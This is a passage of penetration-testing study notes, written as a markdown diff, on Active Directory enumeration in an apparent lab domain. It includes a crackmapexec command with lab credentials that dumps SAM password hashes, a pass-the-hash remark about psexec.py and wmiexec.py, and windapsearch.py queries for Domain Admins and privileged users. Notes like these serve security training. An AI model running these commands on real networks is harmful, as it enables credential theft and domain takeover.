+Even though we are looking into enumerating *domains* in these notes, we thought it worthwhile mentioning here that if we have valid creds for a user who is a *local admin* on a host we can use the `--sam` flag with `crackmapexec` to dump the hashes from the machines *sam* database. We can then attempt to crack these or go further and check to see if any users are local admin on other machines - we will not go into this here but it is worth noting.
+
+```bash=
+crackmapexec smb 172.16.5.130 -u wley -d inlanefreight.local -p 'transporter@4' --sam
+```
+
+![ad73](/images/73.png)
+
+##### Conclusion
+
+By using `psexec.py` or `wmiexec.py` with a captured NTLM hash from Responder, you can attempt a pass-the-hash attack and potentially gain a remote shell on the target machine. Ensure that you have administrative privileges on the target to execute commands or get a shell successfully.
+
+By leveraging these two tools, we can execute commands remotely and interact with a domain controller or any other Windows system where we have local administrative rights. Both tools are highly effective for post-compromise enumeration and further exploitation.
+
+#### Using `windapsearch.py` to Find Domain Admins and Privileged Users
+
+`windapsearch.py` is a powerful tool for querying LDAP information from an Active Directory domain. It can be used to quickly identify key pieces of information about users, groups, and privileges. In this section, we will focus on how to use `windapsearch.py` to locate **Domain Admins** and **privileged users**, and why understanding nested group membership is critical.
+
+---
+
+##### Finding Domain Admins
+The `--da` flag is used to enumerate users who belong to the **Domain Admins** group in Active Directory. These accounts have complete control over the domain, making them high-value targets for attackers.
+
+##### Example Command:
+```bash
+python3 windapsearch.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' --dc-ip <DC_IP> --da
+```
+- `<DOMAIN>`: The Active Directory domain name.
+- `<USERNAME>`: Your credentialed user with read access to LDAP.
+- `<PASSWORD>`: The password for the user.
+- `<DC_IP>`: The IP address of the Domain Controller.
+
+###### Output:
+The command will list the usernames that are members of the **Domain Admins** group, giving a direct list of high-privilege accounts.
+
+![ad74](/images/74.png)
+
+##### Finding Privileged Users
+The `-PU` flag is used to enumerate **privileged users** who belong to sensitive groups, such as **Enterprise Admins**, **Administrators**, **Backup Operators**, **Account Operators**, and more. These accounts often have elevated rights that can be exploited for privilege escalation.
+
+###### Example Command:
+```bash
+python3 windapsearch.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' --dc-ip <DC_IP> -PU
+```
+
+##### Output:
+This command will display users who belong to groups that have elevated privileges across the domain, including those beyond just the **Domain Admins** group.
+
+![ad75](/images/75.png)
+
+![ad76](/images/76.png)
+
+---
+
+##### Why Nested Group Membership is Dangerous
+
+In Active Directory, groups can be **nested** within other groups. This means that users who belong to lower-privilege groups may inherit the permissions of higher-privilege groups if their group is nested within them. This creates a hidden risk where an account may have more privileges than it appears at first glance.
+
+For example, a user who is part of a helpdesk group could inherit administrative rights if that helpdesk group is inadvertently nested within the **Domain Admins** group or another highly privileged group. Attackers exploit these indirect privilege escalations by searching for nested group memberships and targeting accounts that inherit unintended permissions.
+
+---
+
+### Why Privileged Users Matter
+
+While `--da` will give you the **Domain Admins**, the `-PU` flag casts a wider net. Privileged users often have substantial control over systems and data, even if they are not explicitly members of the **Domain Admins** group. This includes groups like:
+- **Enterprise Admins**: Have control over the entire Active Directory forest.
+- **Backup Operators**: Can restore files and directories, giving access to sensitive data.
+- **Account Operators**: Can manage user accounts, allowing for the creation of new accounts with elevated privileges.
+
+Even users with these privileges may not appear suspicious at first glance, but nested memberships and hidden group relationships can provide pathways to domain-wide control.
